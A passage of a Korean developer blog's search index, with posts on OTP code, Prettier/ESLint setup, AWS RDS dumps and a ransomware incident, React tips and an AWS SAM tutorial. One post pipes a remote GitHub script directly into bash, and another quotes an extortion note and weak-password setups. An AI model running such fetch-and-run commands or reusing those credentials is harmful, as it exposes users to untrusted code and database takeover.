token_hex_4bytes.substring(index, index + 2); toekn_hex += (&quot;00&quot; + (Number(`0x${element}`) &amp; 0xff).toString(16)).substr(-2);}const token = Number(`0x${toekn_hex}`).toString().substr(-6);console.log(`token : ${token}`); hmac_hash의 맨 마지막값을 offset으로 한다 hmac_hash offset부터 4바이트를 추출한고 offset 바이트에 &amp; 0x7f 이진 연산 수행 나머지 3개 바이트에 대해 &amp; 0xFF 연산 수행 6자리 토큰을 만든다고하면 그 결과의 뒤에서 6자리를 토큰으로 한다. 개선사항 생성된 토큰 값이 일부분 동일하게 유지된다. 참고 https://youtu.be/VOYxF12K1vE repo ; https://github.com/chinsun9/my-otp","link":"/2020/11/05/otp-%EA%B5%AC%ED%98%84%ED%95%98%EA%B8%B0/"},{"title":"playlist 201906","text":"~","link":"/2020/11/03/playlist-201906/"},{"title":"playlist 202011","text":"~","link":"/2020/11/03/playlist-202011/"},{"title":"playlist 202012","text":"~","link":"/2020/12/15/playlist-202012/"},{"title":"prettier ignore line","text":"마크다운에서는 여러 라인 범위를 포맷팅하지 않도록 설정할 수 있다. formatOnSave 를 사용해서 내용이 많은 마크다운을 저장할 때, 이미 포맷팅이 잘 되어있더라도 좀 오래걸리는 느낌이 있었다. 그래서 포맷팅을 무시하는 설정을 알아보았다. 기분탓인지 몰라도 쫌 빨라진 것 같다..? markdown perttier ignoremd1234567891011121314&lt;!-- prettier-ignore --&gt;Do not format thisformat this&lt;!-- prettier-ignore-start --&gt;| MY | AWESOME | AUTO-GENERATED | TABLE ||-|-|-|-|| a | b | c | d |&lt;!-- prettier-ignore-end --&gt;| MY | AWESOME | AUTO-GENERATED | TABLE || --- | ------- | -------------- | ----- || a | b | c | d | js perttier ignorejs1234// prettier-ignorelet a=1let b = 2; js 에서는 한개의 라인을 포맷하지않도록 설정할 수 있다. js12345678let c = [1, 2, 3];let c = [ // &lt;-- 주석 넣으면 펼쳐짐. 1, 2, 3,]; 중간에 주석을 넣어서 펼쳐지게 포맷팅할 수 있다. 참고 Ignoring Code · Prettier","link":"/2020/11/24/prettier-ignore-line/"},{"title":"process.exit(1)","text":"1process.exit(1); 이 줄을 만나면 즉시 종료된다 나는 보통 코드를 주먹구구로 작성하다가 아래 라인을 실행시키고 싶지 않을 때 사용한다.. 참고 https://nodejs.dev/learn/how-to-exit-from-a-nodejs-program","link":"/2021/01/05/process-exit-1/"},{"title":"random user api","text":"api result123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566{ &quot;results&quot;: [ { &quot;gender&quot;: &quot;male&quot;, &quot;name&quot;: { &quot;title&quot;: &quot;Mr&quot;, &quot;first&quot;: &quot;Alexis&quot;, &quot;last&quot;: &quot;Petit&quot; }, &quot;location&quot;: { &quot;street&quot;: { &quot;number&quot;: 4670, &quot;name&quot;: &quot;Rue Abel-Gance&quot; }, &quot;city&quot;: &quot;Asnières-sur-Seine&quot;, &quot;state&quot;: &quot;Côtes-D'Armor&quot;, &quot;country&quot;: &quot;France&quot;, &quot;postcode&quot;: 50669, &quot;coordinates&quot;: { &quot;latitude&quot;: &quot;1.5987&quot;, &quot;longitude&quot;: &quot;-174.3996&quot; }, &quot;timezone&quot;: { &quot;offset&quot;: &quot;-3:30&quot;, &quot;description&quot;: &quot;Newfoundland&quot; } }, &quot;email&quot;: &quot;alexis.petit@example.com&quot;, &quot;login&quot;: { &quot;uuid&quot;: &quot;0c475137-052f-4e2d-accd-e1f81134085b&quot;, &quot;username&quot;: &quot;smallswan940&quot;, &quot;password&quot;: &quot;roland&quot;, &quot;salt&quot;: &quot;axj95jYj&quot;, &quot;md5&quot;: &quot;9cb8a280ee2ea2c270304e789cf41c4d&quot;, &quot;sha1&quot;: &quot;ad06d250bb7e2e63c41180190fd1a0a87310bed9&quot;, &quot;sha256&quot;: &quot;dcd4a79c08ce63b11e0e210488be6c13d6479c1857978272d22de05743c5a0c8&quot; }, &quot;dob&quot;: { &quot;date&quot;: &quot;1948-07-11T03:52:55.239Z&quot;, &quot;age&quot;: 72 }, &quot;registered&quot;: { &quot;date&quot;: &quot;2019-03-02T05:37:55.591Z&quot;, &quot;age&quot;: 1 }, &quot;phone&quot;: &quot;01-02-20-53-73&quot;, &quot;cell&quot;: &quot;06-62-80-71-34&quot;, &quot;id&quot;: { &quot;name&quot;: &quot;INSEE&quot;, &quot;value&quot;: &quot;1NNaN99470953 54&quot; }, &quot;picture&quot;: { &quot;large&quot;: &quot;https://randomuser.me/api/portraits/men/52.jpg&quot;, &quot;medium&quot;: &quot;https://randomuser.me/api/portraits/med/men/52.jpg&quot;, &quot;thumbnail&quot;: &quot;https://randomuser.me/api/portraits/thumb/men/52.jpg&quot; }, &quot;nat&quot;: &quot;FR&quot; } ], &quot;info&quot;: { &quot;seed&quot;: &quot;40708dc84b376baf&quot;, &quot;results&quot;: 1, &quot;page&quot;: 1, &quot;version&quot;: &quot;1.3&quot; }} https://randomuser.me/ 프사를 포함한 정말 디테일한 정보까지 다 나온다. 요청 url ; https://randomuser.me/api/ cors를 허용하고있기때문에 로컬에서든 어디서든 요청할 수 있다. fetch 예제example.js123fetch(&quot;https://randomuser.me/api&quot;) .then((res) =&gt; res.json()) .then(console.log); 참고 Random User Generator","link":"/2020/11/23/random-user-api/"},{"title":"rds master 사용자 비밀번호 변경","text":"브라우저로 aws 콘솔에 접속해서 마스터 유저 비밀번호를 변경할 수 있다 Amazon RDS &gt; 데이터베이스 &gt; 데이터베이스 선택 &gt; 수정 (수정하고자 하는 RDS가 실행되어 있어야 한다) 새 마스터 암호를 채운다 참고 https://tecadmin.net/recover-reset-amazon-rds-master-user-password/","link":"/2021/01/14/rds-master-%EC%82%AC%EC%9A%A9%EC%9E%90-%EB%B9%84%EB%B0%80%EB%B2%88%ED%98%B8-%EB%B3%80%EA%B2%BD/"},{"title":"rds sqldump 하기","text":"cmd12345678mysqldump -h database-1.aaaaaaaaaaaa.ap-northeast-2.rds.amazonaws.com ^ -u root ^ -p12341234 ^ --port=3306 ^ --single-transaction ^ --routines ^ --triggers ^ --databases TestDB &gt; aaaa.sql 윈도우 cmd에서 aws rds mysqldump를 해보았다. 윈도우 따라하기 cmd를 관리자 권한으로 실행한다 cmd1cd C:\\Program Files\\MariaDB 10.5\\bin mysqldump.exe가 있는 경로까지 이동한다. (나는 로컬에 마리아 디비가 설치되어 있어서..) cmd1234567891011121314151617mysqldump -h {rds 엔드포인트} ^ -u root ^ -p{rds 비밀번호} ^ --port=3306 ^ --single-transaction ^ --routines ^ --triggers ^ --databases {db명} &gt; {백업파일위치}mysqldump -h database-1.aaaaaaaaaaaa.ap-northeast-2.rds.amazonaws.com ^ -u root ^ -p12341234 ^ --port=3306 ^ --single-transaction ^ --routines ^ --triggers ^ --databases TestDB &gt; aaaa.sql 자신에 맞게 설정하고 명령을 붙여넣는다","link":"/2020/10/21/rds-sqldump-%ED%95%98%EA%B8%B0/"},{"title":"rds 삭제 방지 비활성화","text":"rds를 켜놓은 상태에서 수정을 할 수 있다. rds 꺼놓은 상태에서 수정버튼을 누르면 무한 로딩이 기다리고있다..","link":"/2020/11/23/rds-%EC%82%AD%EC%A0%9C-%EB%B0%A9%EC%A7%80-%EB%B9%84%ED%99%9C%EC%84%B1%ED%99%94/"},{"title":"RDS 삭제시 주의사항","text":"ㅠㅠ RDS 삭제 시 자동으로 스냅샷 생성 RDS를 삭제하면 자동으로 스냅샷? 백업같은 것을 생성한다. RDS를 사용중도아니고, 삭제하니까 비용이 생긴게 삭제하면서 생긴 스냅샷 보관 비용이였다. RDS를 삭제한다면 RDS 삭제 후 꼭 RDS &gt; 스냅샷 에서 생성된 스냅샷도 같이 삭제..","link":"/2020/11/06/rds-%EC%82%AD%EC%A0%9C%EC%8B%9C-%EC%A3%BC%EC%9D%98%EC%82%AC%ED%95%AD/"},{"title":"rds 해킹당하기","text":"복구 방법에 대한 글이 아니다. 그냥 털리면 어떻게 되는지, 왜 털렸을까하는 내용의 기록이다. 털린 증상 rds에 접속해보면 내 테이블들이 사라져있고, PLEASE_READ_ME_XMG 라는 데이터베이스가 생겨있고 WARNING 테이블만 존재한다. WARNING테이블을 셀렉트해보면 아래와 같은 메시지가 적혀있다. To recover your lost databases and avoid leaking it: visit http://hn4wg4o6s5nc7763.onion and enter your unique token ee974966c47f1027 and pay the required amount of Bitcoin to get it back. Databases that we have: acl-manager. Your databases are downloaded and backed up on our servers. If we dont receive your payment in the next 9 Days, we will sell your database to the highest bidder or use them otherwise. To access this site you have use the tor browser https://www.torproject.org/projects/torbrowser.html 이 웹사이트에 들어가서 토큰으로 로그인하고 비트코인을 지불하라는 내용이다. 일반 브라우저에서는 접속하지 못하고, tor browser에서만 접속가능하다. 나는 안들어가봤다. 왜냐면 중요한 데이터가 아니였기 때문이다. 털린 이유 rds 퍼블릭 액세스 허용 인바운드 규칙 모두 허용 rds 비밀번호 1234 조치 중요한 정보가 없어서 그냥 rds를 삭제하고 다시 만들었다. 삭제할 때 스냅샷을 만들지 않도록 한다. 스냅샷 저장 비용이 발생할 수 있다. 새로 만든 RDS는 보안그룹 인바운드 규칙에서 내 IP만 접속가능하도록 해주었다. 비밀번호를 어렵게 설정했다.","link":"/2020/11/23/rds-%ED%95%B4%ED%82%B9%EB%8B%B9%ED%95%98%EA%B8%B0/"},{"title":"react Each child in a list should have a unique key prop.","text":"key prop 에 대한 글이 아니고, 단순히 에러 메시지를 뛰우지 않기위해 하는 단순무식한 글이다. example.js1234567&lt;div className=&quot;product__rating&quot;&gt; {Array(rating) .fill() .map((_, i) =&gt; ( &lt;p key={i}&gt;✨&lt;/p&gt; ))}&lt;/div&gt; 반복문을 통해 자식 엘리먼트를 생성할 때, Each child in a list should have a unique key prop. 이 오류 콘솔에 뜨게된다. 콘손에 빨간 오류가 보기 싫어서 인덱스 값으로 key prop을 명시해준다. 참고 key prop이 어떤 용도 인지 공부해보자.. 리스트와 Key – React","link":"/2020/12/02/react-Each-child-in-a-list-should-have-a-unique-key-prop/"},{"title":"react eslint prettier airbnb style guide 적용하기","text":"terminal123456npx create-react-app my-react-appcd my-react-appexec 3&lt;&amp;1;bash &lt;&amp;3 &lt;(curl https://raw.githubusercontent.com/chinsun9/eslint-prettier-airbnb-react/master/eslint-prettier-config.sh 2&gt; /dev/null)yarn start 누군가 자동으로 세팅하는 스크립트를 제작해두었다. 명령어 3개만 입력하면 세팅이 끝난다. windows에서는 gitbash에서 해당 명령을 실행하면 된다. 추가로 eslint 확장도구가 설치되어 있어야한다. 추가로, prettier 확장도구를 통해 자동포맷팅을 사용하는 사람들은 .vscode/settings.json123456{ &quot;editor.codeActionsOnSave&quot;: { &quot;source.fixAll.eslint&quot;: true }, &quot;editor.formatOnSave&quot;: false} &quot;editor.formatOnSave&quot;: false ; prettier 확장도구로 인한 포맷팅은 비활성화해주고, &quot;source.fixAll.eslint&quot;: true ; eslint에서 포맷팅을 하도록한다. TMI따라해도 나오는 오류 Replace onPerfEntry with (onPerfEntry)eslint (prettier/prettier) src/reportWebVitals.js 파일에서 1개의 파라미터만 받는 함수에 괄호로 묶어주라는 오류가 나올 것이다. 이것만 고쳐주면 잘 동작한다. 혹시 빨간줄이 계속남아있거나, 안된다면 vscode를 다시 실행해보자. 계속된 세팅 실패error log1234567891011121314151617181920212223242526272829303132333435363738394041 leadingComments: [ { type: 'Line', value: ' If you want to start measuring performance in your app, pass a function', start: 270, end: 344, loc: [SourceLocation], range: [Array] }, { type: 'Line', value: ' to log results (for example: reportWebVitals(console.log))', start: 345, end: 406, loc: [SourceLocation], range: [Array] }, { type: 'Line', value: ' or send to an analytics endpoint. Learn more: https://bit.ly/CRA-vitals', start: 407, end: 481, loc: [SourceLocation], range: [Array] } ], } ], parent: null }}npm ERR! code ELIFECYCLEnpm ERR! errno 1npm ERR! react-practice@0.1.0 start: `react-scripts start`npm ERR! Exit status 1npm ERR!npm ERR! Failed at the react-practice@0.1.0 start script.npm ERR! This is probably not a problem with npm. There is likely additional logging output above.npm ERR! A complete log of this run can be found in:npm ERR! C:\\Users\\chin_\\AppData\\Roaming\\npm-cache\\_logs\\2020-11-17T06_40_37_514Z-debug.log eslint-config-airbnb 만 설치하면 위 오류가 뜨면서 실행조차 안됬다. 이유는 모르겠다. eslint-prettier-airbnb-react 포크 karlhadwen/eslint-prettier-airbnb-react를 포크해서 내가 오류난 부분을 바꿔주었다. Delete `␍`eslintprettier/prettier 문제였는데, .eslintrc123456789101112131415{ &quot;rules&quot;: { // ... &quot;prettier/prettier&quot;: [ &quot;error&quot;, { &quot;trailingComma&quot;: &quot;es5&quot;, &quot;singleQuote&quot;: true, &quot;printWidth&quot;: 80, &quot;endOfLine&quot;: &quot;auto&quot; // &lt;-- 추가 } ] // ... }} &quot;endOfLine&quot;: &quot;auto&quot;를 추가해어 해결하였다. .prettierrc 파일 불필요 eslint-config-prettier 을 사용해서 prettierrc 파일없이 eslint 설정만으로도 가능하다고한다. eslintrc.json에 rule 아래 prettier/prettier이 있는데, 여기에 내가 필요한 포맷팅 설정을 해두면된다. 여기까지 리액트 프로젝트 https://github.com/chinsun9/react-eslint-prettier-practice 참고 동영상 Setup ESLint, Prettier &amp; Airbnb Style Guide in under 2 Minutes eslint-prettier-airbnb-react","link":"/2020/11/17/react-eslint-prettier-airbnb-style-guide-%EC%A0%81%EC%9A%A9%ED%95%98%EA%B8%B0/"},{"title":"react typescirpt eslint prettier airbnb style guide 적용하기","text":"방법 바로 보기 react typescirpt eslint prettier airbnb style guide 적용 방법은 여기로…https://github.com/chinsun9/typescript-react-eslint-prettier-practice TMI상황 진짜 여러 튜토리얼을 따라해도 뭔가 잘 안됬다. 차근차근 따라하기보다 세팅을 빨리 끝마치고 싶은 생각에 복붙을 시전했다. 일단 뭔가 쫌 되야 이렇구나 생각할텐데 잘안되서 머리가 아팠다. 문제 &amp; 원인vscode setting.json eslint없이 prettier 를 사용하면서 설정해둔 설정값. format on save 이것때문에, 린트 이후에 prettier가 다시 코드를 포맷팅하는 문제 .vscode/setting.json123456{ &quot;editor.codeActionsOnSave&quot;: { &quot;source.fixAll.eslint&quot;: true }, &quot;editor.formatOnSave&quot;: false} 처음에는 이거를 둘다켜놨엇다. 기존에 eslint에서 fix한거 formatOnSave가 다시 prettier 포맷터로 다시 포맷해서 생겼었다. .eslintrc.js Parsing error: “parserOptions.project” has been set for @typescript-eslint/parser. The file does not match your project config: .eslintrc.js. The file must be included in at least one of the projects provided. 이유를 모르겠으나. .js 방식으로하면 위 오류가 떠서 안됬다. 그래서 단순하게 .json방식으로 바꾸었다. 그랬더니 해결됬다.. 알게된 것 eslint-config-prettier 를 통해 별도 .prettierrc 파일없이 eslintrc에서 prettier 설정이 가능하다. reportWebVitals.ts 이런 자동생성된 파일은 린트를 적용시킬 필요가없다. 파일 최상단에 /* eslint-disable */를 적어 무시해주자. 빨간줄이 생기면 희소식이다. 빨간줄 조차 안생기면 eslintrc 파일에 문제가 생긴거다. vscode도 재시작해보자. “source.fixAll.eslint”: true 설정으로 eslint에서 포맷팅을 실행할 수 있다. 쓸모없다고 생각하는 룰은 그냥 꺼버리자. 마우스를 올려서 어떤 룰인지 확인하고 .eslintrc &gt; rules 에 해당 룰을 적고 0으로 세팅한다. 세팅법 - 여기까지 리액트 프로젝트 https://github.com/chinsun9/typescript-react-eslint-prettier-practice readme.md에 설정하는 방법을 정리해두었다. 커밋내역을 보면 명령어 입력 순서가 나와있으니 참고하면 좋을 것 같다. 참고 Create-React-App with TypeScript, ESLint, Prettier, and Github Actions | by Bryan Grill | Medium prettier/eslint-config-prettier","link":"/2020/11/18/react-typescirpt-eslint-prettier-airbnb-style-guide-%EC%A0%81%EC%9A%A9%ED%95%98%EA%B8%B0/"},{"title":"react typescript Prettier 적용하기, Prettier로 여러 파일 한번에 포맷팅하기","text":"settings.json12345678910{ // ... &quot;[typescript]&quot;: { &quot;editor.formatOnSave&quot;: true, &quot;editor.defaultFormatter&quot;: &quot;esbenp.prettier-vscode&quot; }, &quot;[typescriptreact]&quot;: { &quot;editor.formatOnSave&quot;: true, &quot;editor.defaultFormatter&quot;: &quot;esbenp.prettier-vscode&quot;} settings.json에 추가시켜준다. 저장할 때마다 자동으로 포맷팅되는 것을 확인할 수 있다. 일괄적으로 포맷팅하기 prettier 없이 개발했다가 코드 포맷팅을 일괄적으로 하고싶을 때가 있다. .prettierrc1234567{ &quot;singleQuote&quot;: true, &quot;parser&quot;: &quot;typescript&quot;, &quot;semi&quot;: true, &quot;printWidth&quot;: 120, &quot;tabWidth&quot;: 2} .prettierrc 파일을 생성한다. npx prettier -w **/*.tsx terminal에 위 명령을 치면 prettier가 일회성으로 설치되면서 지정한 확장자에 대해 포맷팅을 일괄적으로 실행해준다. .prettierrc prettier config file을 참고해서 실행되니 원하는 디렉터리만, 또는 무시할 디렉터리, 파일들을 설정해서 사용할 수 있다. 참고 Prettier Configuration File","link":"/2020/11/12/react-typescript-Prettier-%EC%A0%81%EC%9A%A9%ED%95%98%EA%B8%B0/"},{"title":"react url params 사용하기","text":"example.tsx12345// 전res = await myFetch(`get/${location.pathname.split('/')[2]}`);// 후res = await myFetch(`get/${id}`); 처음에는 url params에 어떻게 접근할까하다가 location객체에서 수동으로 파싱해서 썼었는데 ‘react-router-dom’ 에서 useRouteMatch라는 메서드를 통해서 자동으로 파싱하고 필요한 차일드에 넘겨주었다. parent.tsx123456789101112// 최상위, 컴포넌트 밖type MatchParams = { id: string;};// 컴포넌트 안 최상위const match = useRouteMatch&lt;MatchParams&gt;('/start/:id');// 렌더 부분, 컴포넌트 안 return 부분&lt;Route path=&quot;/start/:id&quot;&gt; &lt;Start id={match?.params.id || ''} /&gt;&lt;/Route&gt;; child.tsx123456789// 최상위, 컴포넌트 밖type Props = { id: string;};// 컴포넌트 선언부function Start({ id }: Props) { // ...} 차일드에서 useRouteMatch를 사용해보았는데, useEffect에서 무한루프에 걸려서 부모에서 전달해주었다. 참고 velog.io/@bigbrothershin/React Router: 파라미터와 쿼리 https://stackoverflow.com/questions/61392878/how-to-make-useroutematch-work-with-types-from-react-router","link":"/2020/12/16/react-url-params-%EC%82%AC%EC%9A%A9%ED%95%98%EA%B8%B0/"},{"title":"react 카테고리 생성","text":"react 공부한 내용 올리기","link":"/2020/09/18/react-%EC%B9%B4%ED%85%8C%EA%B3%A0%EB%A6%AC-%EC%83%9D%EC%84%B1/"},{"title":"react로 만들어본 퇴근시간 계산기","text":"Go Home Time (React) 기능메인 페이지 목표 시각까지 남은 시간 계산 url param을 통해 목표 시각 세팅 목표 시각이 지나면 퇴근하라는 메시지를 뛰움 about 페이지 링크 공유 기능 퇴근 시간 설정 기능 자동 클립보드 복사 깃허브 페이지 spa 세팅 https://iamsjy17.github.io/react/2018/11/04/githubpage-SPA.html 원리. 404페이지에 스크립트를 두고 index페이지로 url 파라미터로 넘김 배경이미지 출처 https://unsplash.com/photos/WVIkqpoKz1I Photo by @swayte on Unsplash 해결한 문제들gsap 적용안됨 https://github.com/greensock/GSAP/issues/285#issuecomment-433729632 Share.tsx12345import { Power3, TimelineLite } from 'gsap';import CSSPlugin from 'gsap/CSSPlugin'; // 추가// eslint-disable-next-line @typescript-eslint/no-unused-varsconst C = CSSPlugin; // 추가 로컬에서는 애니메이션이 잘 실행되었는데, 빌드 후 애니메이션이 안 나오는 문제 해결 후기 어느 정도 리액트에 익숙해진 것 같다. 주로 사용하는 패턴이 생긴 것 같다. 엄청 간단해 보이지만 이것저것 신경 쓴 것 같은데, 기록을 안 해놨다 ㅠㅠ 나는 코드에 조금의 변화가 생겨도 커밋을 했었는데,, 이번에는 커밋을 안 하고 한 번에 몰아서 마지막에 파일별로 커밋을 했다. 그래서 해결한 문제들이 기억이 잘 안 난다.. ㅠㅠ 신경 썼던 것들input element about 페이지에서는 링크를 생성하는 부분이 있다. 처음에는 input width가 좁았었다. 그래서 고민했던 것이.. input 넓이보다 안의 내용이 더 길면은 끝부분이 감춰진다. input에서 포커스를 해제하면 위 그림처럼, 계속 앞쪽으로 포커스가 자동으로 이동했다. 나는 input 내용의 가장 뒤쪽, url param이 변하는 것에 포커스가 가도록 만들려고 이것저것 해봤는데… 결국엔 그냥 input width를 늘려버리고 끝을 냈다.. github pages SPA 깃허브 페이지는 기본적으로 SPA를 지원하지 않는다. react-router-dom 으로 여러 경로들을 만들어 두면 index 말고는 404 페이지로 리디렉트 된다. 그래서 찾아보니까,,.! 404.html12345678910111213141516171819202122var segmentCount = 1;var l = window.location;l.replace( l.protocol + '//' + l.hostname + (l.port ? ':' + l.port : '') + l.pathname .split('/') .slice(0, 1 + segmentCount) .join('/') + '/?p=/' + l.pathname .slice(1) .split('/') .slice(segmentCount) .join('/') .replace(/&amp;/g, '~and~') + (l.search ? '&amp;q=' + l.search.slice(1).replace(/&amp;/g, '~and~') : '') + l.hash); index.html12345678910111213141516171819(function (l) { if (l.search) { var q = {}; l.search .slice(1) .split('&amp;') .forEach(function (v) { var a = v.split('='); q[a[0]] = a.slice(1).join('=').replace(/~and~/g, '&amp;'); }); if (q.p !== undefined) { window.history.replaceState( null, null, l.pathname.slice(0, -1) + (q.p || '') + (q.q ? '?' + q.q : '') + l.hash ); } }})(window.location); 원리는 index 경로 외에 나머지 경로로 들어오면 404페이지를 반환하는데, 커스텀 404페이지에서 스크립트를 통해서 index페이지로 리디렉트 하게 한다. 이때, url params 및 query string을 가공한다 index.html에서는 404.html로부터 넘겨받은 값으로 라우팅이 적용된 화면을 보여준다. 이걸 만든 사람은 정말 대단한 것 같다. ㄷㄷ; 소스코드 https://github.com/chinsun9/go-home-time 참고github pages spa https://iamsjy17.github.io/react/2018/11/04/githubpage-SPA.html https://github.com/rafgraph/spa-github-pages","link":"/2020/12/18/react%EB%A1%9C-%EB%A7%8C%EB%93%A4%EC%96%B4%EB%B3%B8-%ED%87%B4%EA%B7%BC%EC%8B%9C%EA%B0%84-%EA%B3%84%EC%82%B0%EA%B8%B0/"},{"title":"react에서 Map을 state로 사용할 때","text":"ES6 Map with React.useState ; https://medium.com/@jalalazimi/es6-map-with-react-usestate-9175cd7b409b 를 참고하였다 맞는 예12345678910111213141516171819202122const [state, setState] = React.useState(new Map());const add = (key, value) =&gt; { setState((prev) =&gt; new Map([...prev, [key, value]]));};const upsert = (key, value) =&gt; { setState((prev) =&gt; new Map(prev).set(key, value));}const delete = (key) =&gt; { setState((prev) =&gt; { const newState = new Map(prev); newState.delete(key); return newState; });}const clear = () =&gt; { setState((prev) =&gt; new Map(prev.clear()));} 틀린 예12345678const [state, setState] = React.useState(new Map());const add = (key, value) =&gt; { state.set(key, value); setState(state);};// ... 참고 https://medium.com/@jalalazimi/es6-map-with-react-usestate-9175cd7b409b","link":"/2021/02/17/react%EC%97%90%EC%84%9C-Map%EC%9D%84-state%EB%A1%9C-%EC%82%AC%EC%9A%A9%ED%95%A0-%EB%95%8C/"},{"title":"react에서 html 자동완성 쓰기, emmet 사용하기","text":"settings.json1234567{ // (...) &quot;emmet.triggerExpansionOnTab&quot;: true, // &lt;-- emmet 활성화 &quot;emmet.includeLanguages&quot;: { &quot;javascript&quot;: &quot;javascriptreact&quot; // &lt;-- react에서도 emmet 사용가능하도록 }} settings.json에 추가한다. tab키를 눌러 자동완성할 수 있다. 참고 VScode + React emmet 사용하기 Learn Emmet In 15 Minutes - Double Your HTML Coding Speed","link":"/2020/11/25/react%EC%97%90%EC%84%9C-html-%EC%9E%90%EB%8F%99%EC%99%84%EC%84%B1-%EC%93%B0%EA%B8%B0-emmet-%EC%82%AC%EC%9A%A9%ED%95%98%EA%B8%B0/"},{"title":"readme.md] ios-swift-ImageFinder","text":"gist로 다른 프로젝트의 readme 가져오기… 실험중","link":"/2020/09/17/readme-md-ios-swift-ImageFinder/"},{"title":"reqres.in으로 ajax 연습하기","text":"Reqres 에서 다양한 api를 제공하고있다. cors를 허용하기 때문에 localhost에서도 요청을보내고 응답을 받을 수 있다. ajax 연습이나, 간단한 앱을 만들 때, 서버를 만들지 않고, reqres에서 제공하는 api를 사용할 수 있겠다. get api https://reqres.in/api/users?page=2 // 유저 목록 2페이지 보기https://reqres.in/api/users/2 // 2번 유저 보기https://reqres.in/api/users/23 // 23번 유저 보기(없는 유저) // products보기, products 부분은 어떤 문자열로든 치환이 가능해서 원하는 느낌의 문자열을 적어주면된다.https://reqres.in/api/productshttps://reqres.in/api/products/1","link":"/2020/11/03/reqres-in%EC%9C%BC%EB%A1%9C-ajax-%EC%97%B0%EC%8A%B5%ED%95%98%EA%B8%B0/"},{"title":"sam template.yaml 익히는 빠른 방법","text":"브라우저에서 aws console 통해 람다 수정해보고 작업 &gt; 내보내기 &gt; aws sam 파일 다운로드 하기 여기서 aws sam 파일은 template.yaml이다. 익히는 법 처음에 할때는 gui만큼 쉬운게 없다. sam을 시작하면 yaml을 어떻게 건드려야할지 감이 안올 것이다. 그럴때는 역으로 브라우저에서 내가 설정할 권한들을 설정하고 저장한다. 그리고 작업 &gt; 내보내기 &gt; aws sam 파일 다운로드를 통해 어떻게 yaml이 수정되었는지 확인해보면 된다.","link":"/2020/09/21/sam-template-yaml-%EC%9D%B5%ED%9E%88%EB%8A%94-%EB%B9%A0%EB%A5%B8-%EB%B0%A9%EB%B2%95/"},{"title":"sam 시작하기","text":"sam을 이용해서 hello world 프로젝트 만들어 보기 nodejs로 만든다 전제조건 aws 계정 (프리티어) aws cli 설치 sam cli 설치 (aws cli, sam cli 순으로 설치한다.) Credentilas Setting (aws configure) SAM(Serverless Application Model) 겁나 어려워 보이는데 그냥 람다 생성기라고 생각하면 된다. 로컬에서 편하게 vscode로 람다함수짜고 yml 파일 수정해서..! 로컬 테스트 환경도 제공한다! 따라하기cmd1234567sam initC:\\tmp&gt;sam initWhich template source would you like to use? 1 - AWS Quick Start Templates 2 - Custom Template LocationChoice: 1번, 1번해서 AWS Quick Start Templates, nodejs 를 골라준다. cmd1Project name [sam-app]: hello-world 프로젝트명 설정하면, 샘플 프로젝트를 가져온다. cmd12345678910AWS quick start application templates: 1 - Hello World Example 2 - Step Functions Sample App (Stock Trader) 3 - Quick Start: From Scratch 4 - Quick Start: Scheduled Events 5 - Quick Start: S3 6 - Quick Start: SNS 7 - Quick Start: SQS 8 - Quick Start: Web BackendTemplate selection: 1 1번 선택하여 헬로월드 템플릿을 받아온다. cmd1cd hello-world 이제 생성된 프로젝트로 들어간다. 1234567891011.├── events│ └── event.json├── hello-world│ ├── tests/│ ├── .npmignore│ ├── app.js│ └── package.json├── .gitignore├── README.md└── template.yaml 디렉터리 구조는 이러하다. 여기서 중요한 파일은 hello-world/app.js와 template.yaml이다. 2개 파일 소스 대충 어떻게 생겼는지 봐보고 빌드해본다. cmd12345678910111213141516171819sam buildC:\\tmp\\hello-world&gt;sam buildBuilding function 'HelloWorldFunction'Running NodejsNpmBuilder:NpmPackRunning NodejsNpmBuilder:CopyNpmrcRunning NodejsNpmBuilder:CopySourceRunning NodejsNpmBuilder:NpmInstallRunning NodejsNpmBuilder:CleanUpNpmrcBuild SucceededBuilt Artifacts : .aws-sam\\buildBuilt Template : .aws-sam\\build\\template.yamlCommands you can use next=========================[*] Invoke Function: sam local invoke[*] Deploy: sam deploy --guided .aws-sam 이라는 폴더가 생성된다. 1234567.aws-sam└── build ├── HelloWorldFunction │ ├── node_modules/ │ ├── app.js │ └── package.json └── template.yaml 이제 배포해보자 cmd1sam deploy -g 배포하자. -g옵션은 --guided 와 동일하다. 이 옵션은 최초에 배포할때만 사용된다. cmd log123456789101112131415Configuring SAM deploy====================== Looking for samconfig.toml : Not found Setting default arguments for 'sam deploy' ========================================= Stack Name [sam-app]: test-sam-app AWS Region [us-east-1]: ap-northeast-2 #Shows you resources changes to be deployed and require a 'Y' to initiate deploy Confirm changes before deploy [y/N]: y #SAM needs permission to be able to create roles to connect to the resources in your template Allow SAM CLI IAM role creation [Y/n]: y HelloWorldFunction may not have authorization defined, Is this okay? [y/N]: y Save arguments to samconfig.toml [Y/n]: y 먼저 Stack Name을 지정해준다. 공란으로 하면 sam-app으로 적용된다. 다음은 리전 설정이다. 나는 서울 ap-northeast-2로 지정했다 다음은 전부다 y 해준다. cmd log123456789101112131415161718CloudFormation stack changeset----------------Operation LogicalResourceId ResourceType----------------+ Add HelloWorldFunctionHelloWorldPermissionProd AWS::Lambda::Permission+ Add HelloWorldFunctionRole AWS::IAM::Role+ Add HelloWorldFunction AWS::Lambda::Function+ Add ServerlessRestApiDeployment47fc2d5f9d AWS::ApiGateway::Deployment+ Add ServerlessRestApiProdStage AWS::ApiGateway::Stage+ Add ServerlessRestApi AWS::ApiGateway::RestApi----------------Changeset created successfully. arn:aws:cloudformation:ap-northeast-2:111111111111:changeSet/samcli-deploy1600652952/89cf8cb3-a626-44ef-bd26-815dacedaa8ePreviewing CloudFormation changeset before deployment======================================================Deploy this changeset? [y/N]: y 또 어쩌구 저쩌구 나오면서 마지막 확인을 받는데 y 해준다. cmd log1Successfully created/updated stack - test-sam-app in ap-northeast-2 그러면 시간이 쫌 걸리면서 aws에 올라가게 된다. 또 samconfig.toml 파일이 생성된 것을 확인할 수 있다. 이제 브라우저를 열어서 aws lambda 로 들어간다 위와 같이 [스택네임]-HelloWorldFunction이름의 함수 하나가 생성되었다. 눌러서 들어간다 이런 화면이 나온다 api 게이트웨이를 클릭한다. 그러면 아래 화면이 api 게이트웨이로 바뀐다. 거기서 다시 세부 정보를 클릭해서 api 엔드포인트를 확인한다. 엔드포인트를 눌러 접속한다. {&quot;message&quot;:&quot;hello world&quot;}이 보이면 성공이다. 이렇게 다짜고짜 sam으로 람다를 만들어 보았다. 해설 sam Hello World Example template를 이용해서 람다를 만들었다. 이 람다는 어떤 주소로 접속하면 hello world를 반환하는 람다이다. 현재 프로젝트 구조를 잘 